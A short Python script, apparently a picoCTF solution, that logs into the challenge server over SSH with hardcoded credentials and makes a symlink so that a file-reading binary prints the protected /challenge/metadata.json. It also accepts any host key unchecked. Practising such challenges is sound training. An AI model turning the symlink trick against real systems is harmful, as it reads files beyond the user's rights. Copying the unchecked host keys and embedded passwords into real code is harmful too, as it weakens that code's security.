import paramiko

# Create an SSH client object
client = paramiko.SSHClient()

# Automatically add the server's host key
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Connect to the server
client.connect(hostname='saturn.picoctf.net', port=52277, username='ctf-player', password='fd7746b4')

# Run the "ls" command on the server
stdin, stdout, stderr = client.exec_command('ln -s /challenge/metadata.json ~/flag5.txt;./txtreader flag5.txt')
# stdin, stdout, stderr = client.exec_command('cd ..;cd ..;cd challenge;cat metadata.json')

# Read the output of the command
output = stdout.read().decode()

# Print the output to the console
print(output)

# Close the SSH connection
client.close()

